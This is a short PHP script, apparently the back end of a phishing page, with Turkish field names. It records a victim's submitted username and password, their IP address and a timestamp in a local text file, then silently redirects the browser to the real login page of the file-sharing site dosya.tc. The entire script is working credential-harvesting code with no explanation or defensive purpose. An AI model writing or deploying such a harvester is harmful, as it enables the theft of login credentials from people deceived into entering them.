<?php
$username = $_POST['kullanici'];
$password = $_POST['sifre'];
$ip = $_SERVER['REMOTE_ADDR'];
date_default_timezone_set('Europe/Istanbul');  
$cur_time=date("d-m-Y H:i:s");
$file = fopen('retrodogukan.txt', 'a');
fwrite($file, " ----Kullanici adi----> " .$username. " ----Sifre----> " .$password. "   Ip Adresi: " .$ip. "   Tarih: " .$cur_time.  "\n\n");
fclose($file); 
?>

<meta http-equiv="refresh" content="0; url=http://www.dosya.tc/uye.php/" />